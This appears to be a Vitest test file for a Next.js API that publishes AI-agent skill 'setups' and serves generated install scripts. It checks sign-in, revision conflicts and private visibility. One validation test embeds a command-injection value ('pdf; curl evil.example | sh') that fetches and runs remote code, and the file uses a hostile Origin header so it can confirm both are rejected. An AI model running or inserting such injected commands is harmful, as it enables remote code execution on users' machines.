import { beforeEach, describe, expect, it, vi } from "vitest";
vi.mock("server-only", () => ({}));
vi.mock("next/headers", async () => ({ cookies: async () => (await import("../../../lib/server/test-support")).cookieStore }));
import type { Client } from "@libsql/client";
import { GET, POST } from "./route";
import { DELETE, PATCH } from "./[id]/route";
import { GET as me } from "../me/route";
import { freshDatabase, jar, post } from "../../../lib/server/test-support";
import { createSession, createUser } from "../../../lib/server/store/users";
import { upsertProfile } from "../../../lib/server/store/setups";

let db: Client;
const setup = {
  title: "Daily driver",
  slug: "daily-driver",
  description: "",
  items: [{ kind: "skill", repository: "anthropics/skills", skill: "pdf", note: "" }],
  published: true,
};
async function signIn(kind: "github" | "anonymous" = "github", login = "ElianCoder") {
  const user = await createUser(db, kind, kind === "github" ? Math.floor(Math.random() * 1e6) + 1 : null);
  if (kind === "github") await upsertProfile(db, user.id, { login, name: "Ian", avatar_url: null });
  jar.set("ac_session", (await createSession(db, user.id)).token);
  return user;
}
const context = (id: string) => ({ params: Promise.resolve({ id }) });
const req = (method: string, body?: unknown) => new Request("http://localhost/api/setups/x", { method, body: body === undefined ? undefined : JSON.stringify(body) });
beforeEach(async () => {
  db = await freshDatabase();
});
describe("setups API", () => {
  it("reports sign-in options and a signed-out state", async () => {
    expect(await (await me(new Request("http://localhost/api/me"))).json()).toEqual({
      configured: true,
      signIn: { github: false, dev: false },
      profile: null,
      setups: [],
    });
  });
  it("rejects unsafe or malformed setups before storing anything", async () => {
    await signIn();
    for (const body of [
      { ...setup, items: [{ ...setup.items[0], skill: "pdf; curl evil.example | sh" }] },
      { ...setup, items: [] },
      { ...setup, user_id: "someone-else" },
      { ...setup, slug: "Not A Slug" },
    ])
      expect((await POST(post("/api/setups", body))).status).toBe(400);
    expect((await POST(post("/api/setups", setup, { headers: { Origin: "https://evil.example" } }))).status).toBe(403);
    expect((await db.execute("select count(*) as n from setups")).rows[0].n).toBe(0);
  });
  it("requires a signed-in profile; anonymous builder sessions cannot publish", async () => {
    expect((await POST(post("/api/setups", setup))).status).toBe(401);
    await signIn("anonymous");
    expect((await POST(post("/api/setups", setup))).status).toBe(401);
  });
  it("creates, conflicts on stale revisions, and keeps others out", async () => {
    await signIn();
    const created = await POST(post("/api/setups", setup));
    expect(created.status).toBe(201);
    const { id } = await created.json();
    expect((await POST(post("/api/setups", setup))).status).toBe(409);
    expect((await PATCH(req("PATCH", { setup: { ...setup, title: "Renamed" }, revision: 1 }), context(id))).status).toBe(200);
    expect((await PATCH(req("PATCH", { setup, revision: 1 }), context(id))).status).toBe(409);
    expect((await PATCH(req("PATCH", { setup, revision: 0 }), context(id))).status).toBe(400);
    const mine = await (await me(new Request("http://localhost/api/me"))).json();
    expect(mine.profile.handle).toBe("eliancoder");
    expect(mine.setups[0]).toMatchObject({ title: "Renamed", revision: 2, items: setup.items });
    await signIn("github", "sam");
    expect((await PATCH(req("PATCH", { setup, revision: 2 }), context(id))).status).toBe(409);
    expect((await DELETE(req("DELETE"), context(id))).status).toBe(404);
  });
  it("serves published setups to visitors without a session, and never private ones", async () => {
    await signIn();
    await POST(post("/api/setups", setup));
    await POST(post("/api/setups", { ...setup, slug: "secret", title: "Secret", published: false }));
    jar.clear();
    const all = await (await GET(new Request("http://localhost/api/setups"))).json();
    expect(all.setups.map((s: { slug: string }) => s.slug)).toEqual(["daily-driver"]);
    const one = await (await GET(new Request("http://localhost/api/setups?handle=ElianCoder&slug=daily-driver"))).json();
    expect(one.setup.items).toEqual(setup.items);
    expect((await GET(new Request("http://localhost/api/setups?handle=eliancoder&slug=secret"))).status).toBe(404);
    expect((await GET(new Request("http://localhost/api/setups?handle=bad%20handle"))).status).toBe(400);
  });
});
import { POST as resolve } from "./resolve/route";
import { GET as installScript } from "../../u/[handle]/[slug]/install.sh/route";
describe("import lookup and install script", () => {
  it("resolves bare names from the catalog and published setups only", async () => {
    await signIn();
    await POST(post("/api/setups", { ...setup, items: [{ kind: "skill", repository: "mattpocock/skills", skill: "grill-me", note: "" }] }));
    await POST(post("/api/setups", { ...setup, slug: "hidden", published: false, items: [{ kind: "skill", repository: "private/repo", skill: "secret", note: "" }] }));
    const { matches } = await (await resolve(post("/api/setups/resolve", { names: ["grill-me", "pptx", "secret", "unknown"] }))).json();
    expect(matches).toEqual({
      "grill-me": [{ repository: "mattpocock/skills", skill: "grill-me", from: "setups", uses: 1 }],
      pptx: [{ repository: "anthropics/skills", skill: "pptx", from: "catalog", uses: 0 }],
      secret: [],
      unknown: [],
    });
    expect((await resolve(post("/api/setups/resolve", { names: ["Bad Name"] }))).status).toBe(400);
  });
  it("serves a shell script for published setups and nothing for private ones", async () => {
    await signIn();
    await POST(post("/api/setups", setup));
    await POST(post("/api/setups", { ...setup, slug: "hidden", published: false }));
    jar.clear();
    const params = (slug: string) => ({ params: Promise.resolve({ handle: "eliancoder", slug }) });
    const response = await installScript(new Request("http://127.0.0.1:3000/u/eliancoder/daily-driver/install.sh", { headers: { host: "127.0.0.1:3000" } }), params("daily-driver"));
    expect(response.headers.get("content-type")).toBe("text/plain; charset=utf-8");
    const script = await response.text();
    expect(script).toMatch(/^#!\/bin\/sh\n/);
    expect(script).toContain("npx skills add 'anthropics/skills' --skill 'pdf'");
    expect(script).toContain("# Source: http://127.0.0.1:3000/u/eliancoder/daily-driver");
    expect((await installScript(new Request("http://localhost/x"), params("hidden"))).status).toBe(404);
  });
});
